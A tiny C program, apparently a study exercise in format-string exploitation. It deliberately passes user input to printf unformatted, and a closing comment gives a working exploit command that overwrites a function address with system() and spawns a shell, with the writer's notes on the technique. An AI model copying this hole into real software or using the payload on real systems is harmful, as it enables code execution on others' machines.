#include <stdio.h>
#include <string.h>
// compile with gcc -m32 temp.c

void foo(char *ch)
{
	char buf[100];
	strncpy(buf, ch, 100);
	printf(buf); 
	char *name = strdup(buf); 
	printf("\nHello %s", name);	
}

int main(int argc, char** argv) 
{
	foo(argv[1]);
	return 0;
}

/*
./string `python -c 'import struct; print "sh;#" + struct.pack("<I", 0x804a010) + struct.pack("<I", 0x804a012) +"%10948x%11$hn%13068x%12$hn"'`
shell is spawned with sh;#
In short you are writing your own printf statement
you have the first two upper bytes of the address
then you have the next two lower bytes of the address
Use %<numofspaces>x to create a num = two upper bytes of system
then %11 is an offset of buffer --> how to find?
then do the same for the two lower bytes
*/
